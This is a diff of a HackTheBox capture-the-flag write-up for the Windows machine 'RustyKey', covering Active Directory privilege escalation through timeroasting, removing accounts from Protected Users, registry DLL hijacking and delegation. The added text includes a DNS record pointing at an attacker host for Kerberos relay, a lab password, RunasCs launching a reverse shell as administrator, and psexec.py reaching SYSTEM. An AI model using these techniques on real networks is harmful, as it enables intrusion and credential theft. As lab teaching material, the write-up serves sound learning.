@@ -1,3 +1,19 @@
+---
+layout: post
+title: "week 7 rustykey"
+date: 2025-07-05 00:00:00 -0700
+categories: challenges
+description: "Rusty Key is a Windows challenge that targets machine delegation privilege escalation and DLL injections to laterally move."
+parent: HackTheBox - Season 8
+grand_parent: Challenges
+event: "htb-season-8"
+tags:
+- "msfvenom"
+- "windows"
+- "hard"
+- "delegation"
+- "timeroasting"
+---
 # week7-rustkey
 
 ## Engagement Notes
@@ -336,20 +352,7 @@ This mostly comes with the benefit of hindsight. During the engagement I didn't 
     INFO: Found 0 trusts
     INFO: Starting computer enumeration with 10 workers
     INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
-    INFO: Querying computer: 
+    <snip>
     INFO: Querying computer: dc.rustykey.htb
     INFO: Done in 00M 21S
 
@@ -428,8 +431,16 @@ This one's a staple. I'll later start using ldeep which will also enumerate thes
     Certificate Templates                   : [!] Could not find any certificate templates
 
 
+Here's our first target, HelpDesk. With this we can get access to all groups and functions that support remote authentication or delegation permissions. And our first target, based on permissions to addself to helpdesk, will be it-computer3
+
+![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-07-05-week7-rustykey.md/2025-07-05-week7-rustykey/images/image.png)
+
+![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-07-05-week7-rustykey.md/2025-07-05-week7-rustykey/images/image-1.png)
+
 ### Rabbit hole of KerbRelayX
 This didn't go anywhere, but it is a super interesting application of attempting to force a kerberos callback to a listener to steal credentials if you have a valid agent that can phone back home. Because of SMBSigning throughout this challenge, NTLMRelay/KerbRelay do not work; but it was a fun exercise so I'm leaving these notes here because I did get phones home at least..
+
+I should have taken the hint for it-computer3 that timeroasting is a viable approach, but I didn't know it existed yet.
 
 ```sh
  python dnstool.py -u 'rustykey.htb\rr.parker' -p '8#t5HE8L!W3A' -d "10.10.14.81" --action add -r "dc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcp -k dc.rustykey.htb --print-zones
@@ -585,7 +596,7 @@ By querying the NTP service we can do shenanigans to pull a list of machines and
     1 passwords recovered.
 
 
-It's worth noting there that the newest version of hashcat can crack this wayyyy faster.
+It's worth noting there that the newest version of hashcat can crack this wayyyy faster. Also by looking up the RID of the account we're interested in, we can cut down a lot of waiting.
 
 
 ```python
@@ -595,6 +606,8 @@ It's worth noting there that the newest version of hashcat can crack this wayyyy
     Password for it-computer3$@RUSTYKEY.HTB: 
     Warning: encryption type arcfour-hmac used for authentication is deprecated and will be disabled
 
+
+A note about "[Protected Users](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#protected-users)": These are effectively accounts that do not allow NTLM, nor do they obey the default configurations for kerberos TTL and kerberos ciphers. If we want to authenticate using anyone at all, we're going to need to remove them from this group.
 
 At this point I'm finally using kerbrute witha  password list I'm maintaining locally. I'm spending a lot of time working through "what can dd.ali do" but it's all unnecessary because it-computer can do everything we actually need. This may be unintentional as I think it's intended for bb.morgan to do some work and maybe use dd.ali as a pivot for the impersonation, but whatever.
 
@@ -647,6 +660,7 @@ $krb5tgs$23$*dd.ali$RUSTYKEY.HTB$rustykey.htb/dd.ali*$9cdf790d716a4e9f058184979a
 
 With the password reset, I still couldn't get in. I did learn that KRB5_TRACE exists and gives super helpful information, but I still hadn't set the encryption types in krb5 from before. If you've followed along and copied my initial krb5.conf, you wont' have this problem.
 
+```sh
 KRB5_TRACE=/dev/stdout KRB5CCNAME=./bb.morgan.ccache KRB5_CONFIG=./krb5.secure.conf kinit bb.morgan
 [345378] 1751365804.563526: Getting initial credentials for bb.morgan@RUSTYKEY.HTB
 [345378] 1751365804.563528: Sending unauthenticated request
@@ -671,6 +685,7 @@ KRB5_TRACE=/dev/stdout KRB5CCNAME=./bb.morgan.ccache KRB5_CONFIG=./krb5.secure.c
 [345378] 1751365804.563548: Sending DNS SRV query for _kerberos-master._tcp.RUSTYKEY.HTB.
 [345378] 1751365804.563549: No SRV records found
 kinit: KDC has no support for encryption type while getting initial credentials
+```
 
 At some point my friend just tried removing members from Protected Objects and was able to do it, no questions asked. So we'll just go forth and give ourselves access to the box.
 
@@ -827,7 +842,9 @@ The reverse shell I'll be using:
 
 Something I learned as well, different payloads are built differently (to no one's surprise). But some such differences that are meaningful include the way the shell is spawned. In the case of shell/reverse_tcp (as opposed to shell/meterpreter/reverse_tcp), a child is forked and then orphaned. So when the shell is spawned, it won't die as soon as explorer.exe is killed as is the case in this exercise.
 
-It's worth noting here, that the access to the registry is only for IT. 
+It's worth noting here, that the access to the registry is only for IT. And looking back at Bloodhound for our next target to know what we're trying to get to with our new credentials, we'll find that mm.turner is whom we're hoping we can get. Based on the fact that their login count is in the many thousands as I enumerated LDAP, it's safe to say there's likely a login by mm.turner happening frequently, so hopefully injecting a DLL into a process that will hopefully spawn with every login can be a viable way to take over the account.
+
+![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-07-05-week7-rustykey.md/2025-07-05-week7-rustykey/images/image-2.png)
 
 Using ee.reed and RunasCs, we can pass our key edits with our reverse shell binary to be triggered when explorer.exe is opened.
 
@@ -977,6 +994,7 @@ RUSTYKEY\Administrator:<snip>
 
 And using the cracked password from secretsdump, or any million other way to get admin credentials/tickets with a domain admin:
 
+Using more Runas for example, to spawn another reverse shell
 ```sh
 ./RunasCs.exe administrator '<snip>' 'C:\Windows\Temp\shell.exe'
 PS C:\Windows\system32> whoami
@@ -986,3 +1004,20 @@ PS C:\Windows\system32> type ~/desktop/root.txt
 type ~/desktop/root.txt
 7009df001bb824b882b95d11b600ffaf
 ```
+
+Or using psexec.py with the ccache:
+```sh
+ KRB5CCNAME=./admin.ccache psexec.py dc.rustykey.htb -k -no-pass
+C:\Windows\Temp> whoami
+nt authority\system
+```
+
+Finally the bloodhound review is as such:  
+
+![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-07-05-week7-rustykey.md/2025-07-05-week7-rustykey/images/image-4.png)  
+![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-07-05-week7-rustykey.md/2025-07-05-week7-rustykey/images/image-5.png)  
+
+And because of a cron loading a session for mm.turner every minute, we can takeover the account and set this up:
+
+![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-07-05-week7-rustykey.md/2025-07-05-week7-rustykey/images/image-3.png)  
+
